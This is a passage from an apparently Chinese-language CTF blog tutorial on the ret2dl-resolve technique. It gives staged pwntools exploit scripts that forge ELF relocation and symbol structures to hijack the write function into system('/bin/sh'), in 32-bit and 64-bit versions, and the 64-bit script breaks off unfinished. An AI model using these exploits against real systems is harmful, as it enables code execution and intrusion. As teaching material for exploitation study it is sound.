class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; </span><br><span class="line">    Elf32_Addr st_value;</span><br><span class="line">    Elf32_word st_size; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; </span><br><span class="line">    Elf32_Section st_shndx; </span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>符号表项的具体结构也在上次的静态链接中介绍过，这里重点在于st_name，其决定了其符号的字符串在字符串表的位置。</p><p>我们先列出后面需要用到的地址plt_0的地址可以在ida中找到，如果找不到可以</p><p>先查找<a href="mailto:&#114;&#101;&#x61;&#100;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;">&#114;&#101;&#x61;&#100;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;</a>里存放的代码地址</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202356235.png" alt="查看.got.plt表"></p><p>然后再查看这部分代码就可以得到plt0的位置啦</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202734272.png" alt="查看代码得到plt0"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=<span class="number">112</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">write_plt_without_push=<span class="number">0x08049060</span><span class="comment">#和plt_0等价</span></span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line"></span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x600</span></span><br></pre></td></tr></table></figure><p>接下来还是一样做栈迁移到.bss段，并做后续的工作，防止爆栈</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来我们也借用CTF Wiki的渐进思路来一步步深入的学习这个部分</p><h4 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h4><p>我们先做简单的一步，手动调用plt[0]，来解析write函数，将我们的命令打印出来即可。我们需要提前将write_reloc_age给push进栈，也就是我们只要在栈里存放着write的write_reloc_age即可。这里寻找write的reloc_age也和之前找plt[0]的方法一样。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820151957887.png" alt="寻找write的reloc_age"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_reloc_age=<span class="number">0x10</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820155824511.png" alt="得到我们的/bin/sh\x00"></p><h4 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h4><p>我们这步控制好reloc_age的大小，然后使得reloc落在我们可以控制的.bss段，让其指向我们伪造的write重定位项，这样就可以控制道r_info</p><p>我们先查看我们我们文件的重定位表<code>readelf -r level3_partialrelro_32</code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820165349463.png" alt="查看重定位表"></p><p>这样就可以找到我们write的r_info</p><p>剩下的就是将write的指针指向我们我们复制在.bss段的重定位项。更改一下我们之前的payload即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r_info=<span class="number">0x407</span></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=p32(write_got)</span><br><span class="line">payload+=p32(r_info)</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()x00</span><br></pre></td></tr></table></figure><p>成功输出了/bin/sh\x00</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820171854054.png" alt="同样得到我们的/bin/sh、x00"></p><h4 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h4><p>这一阶段我们控制我们之前控制好的r_info，使得write的Elf32_Sym落在我们的可控范围内</p><p>我知道我们的r_info分为两部分，32位下，第八位为重定位入口类型，高24位为重定位入口的符号在符号表的下标。</p><p>我们write的r_info是0x407，也就是偏移为4，重定位类型为7</p><p>这里我们要将write的Elf32_Sym到我们的.bss段上，而且要保证其16字节对齐</p><p>我们除了修改r_info之外还要复制一份write的Elf32_Sym。先查看一下其内容，由于之前我们得到其offset为4，那么我们可以通过查看整个symtab得到他</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820204830683.png" alt="获取write的Elf32_Sym"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(<span class="number">0x31</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+align+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="阶段四"><a href="#阶段四" class="headerlink" title="阶段四"></a>阶段四</h4><p>在上一阶段我们控制了Elf32_Sym，接下来就可以控制字符串表了，我们可以通过修改st_name来寻找到字符串表，将其放置在我们的.bss段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">36</span>+align+<span class="number">0x10</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(fake_st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_str=<span class="string">&#x27;write\x00&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+<span class="built_in">len</span>(fake_write_str)+align+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=fake_write_str</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820211523106.png" alt="同样成功"></p><h4 id="阶段五"><a href="#阶段五" class="headerlink" title="阶段五"></a>阶段五</h4><p>既然我们已经控制了字符串表，剩下的就是将其修改掉即可，我们只要将write修改为system，还有将关于偏移和函数调用的参数全部修改即可将write劫持到system从而拿取shell。</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">write_plt_without_push=<span class="number">0x08049060</span><span class="comment">#和plt_0等价</span></span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=fake_stack+<span class="number">5</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-<span class="number">8</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>-<span class="number">8</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">36</span>-<span class="number">8</span>+align+<span class="number">0x10</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(fake_st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_str=<span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(<span class="number">0</span>)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+<span class="built_in">len</span>(fake_write_str)+align+<span class="number">4</span>)</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=fake_write_str</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO且需要泄露地址）"><a href="#64位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO且需要泄露地址）" class="headerlink" title="64位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO且需要泄露地址）"></a>64位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO且需要泄露地址）</h3><p>在开始攻击之前我们要先来看看64位下一些结构体的变化</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Addrr_offset;</span><br><span class="line">    Elf64_Xwordr_info;</span><br><span class="line">    Elf64_Sxwordr_addend;</span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure><p>这里相较于32位每个成员的大小变为了64位，即为8个字节，多了一个r_addend，一共为24个字节。Elf32_Rela 中是用r_addend 显式地指出加数;而对 Elf32_Rel来说,加数是隐含在被修改的位置里的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Wordst_name;               </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;               </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;                </span><br><span class="line">Elf64_Sectionst_shndx;                </span><br><span class="line">Elf64_Addrst_value;                </span><br><span class="line">Elf64_Xwordst_size;               </span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>其中st_name为32位，st_info和st_info各8位，st_shndx为16位，st_value和st_size各64位，一共为24个字节。</p><p>我们通过上面的分析知道64位有高概率会劫持失败，所以我们需要做一些额外的操作</p><p>还是之前的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到如果不进入这个判断语句就不会触发，也就是把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL。我们知道<strong>got表的第零项储存的是link_map</strong>,这样我们只需要泄露并修改掉 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 即可，而其偏移可以通过调试得到是0x1c8</p><p>剩下的和32差别不大，就不一一列举了，一次放在exp中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">link_map_got=<span class="number">0x404008</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=<span class="number">0x401156</span></span><br><span class="line">plt_0=<span class="number">0x401020</span></span><br><span class="line"></span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr<span class="comment">#64位中.rel.plt被称作.rela.plt</span></span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,不可为0</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(link_map_got)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x8</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(write_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line">payload+=p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">link_map_addr=u64(rv(io,<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;link_map_addr : &#x27;</span>+<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line">payload+=p64(pop_rbp_ret)<span class="comment">#栈劫持防止环境变量被破坏</span></span><br><span class="line">payload+=p64(fake_stack)</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sla(io,<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela_base_addr=fake_stack+<span class="number">0x100</span><span class="comment">#Elf64_Rela需要一块地址存放它</span></span><br><span class="line">fake_write_Elf64_Sym_base_addr=fake_stack+<span class="number">0x180</span><span class="comment">#Elf64_Sym需要一块地址存放它</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">0x200</span><span class="comment">#字符串的地址</span></span><br><span class="line">binsh_addr=fake_stack+<span class="number">0x208</span><span class="comment">#/bin/sh\x00的地址</span></span><br><span class="line"></span><br><span class="line">rel_plt_align=<span class="number">0x18</span>-(fake_write_Elf64_Rela_base_addr-rel_plt_addr)%<span class="number">0x18</span><span class="comment">#结构体的对齐填充字节，结构体大小为0x18</span></span><br><span class="line">rel_sym_align=<span class="number">0x18</span>-(fake_write_Elf64_Sym_base_addr-dynsym_addr)%<span class="number">0x18</span><span class="comment">#同上</span></span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela_addr=fake_write_Elf64_Rela_base_addr+rel_plt_align<span class="comment">#Elf64_Rela地址</span></span><br><span class="line">fake_write_Elf64_Sym_addr=fake_write_Elf64_Sym_base_addr+rel_sym_align<span class="comment">#Elf64_Sym地址</span></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=(fake_write_Elf64_Rela_addr-rel_plt_addr)/<span class="number">0x18</span> <span class="comment">#伪造的reloc_arg</span></span><br><span class="line">fake_info=(((fake_write_Elf64_Sym_addr-dynsym_addr)/<span class="number">0x18</span>)&lt;&lt;<span class="number">0x20</span>)|<span class="number">0x7</span> <span class="comment">#伪造r_info，偏移要计算成下标，需要除以Elf64_Sym的大小且要保证最后一字节为0x7</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Rela =p64(write_got)</span><br><span class="line">fake_write_Elf64_Rela+=p64(fake_info)</span><br><span class="line">fake_write_Elf64_Rela+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_write_Elf64_Sym =p32(fake_st_name)</span><br><span class="line">fake_write_Elf64_Sym+=p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_Elf64_Sym+=p64(<span class="number">0</span>)</span><br><span class="line">fake_write_Elf64_Sym+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#改写l_info[VERSYMIDX(DT_VERSYM)] 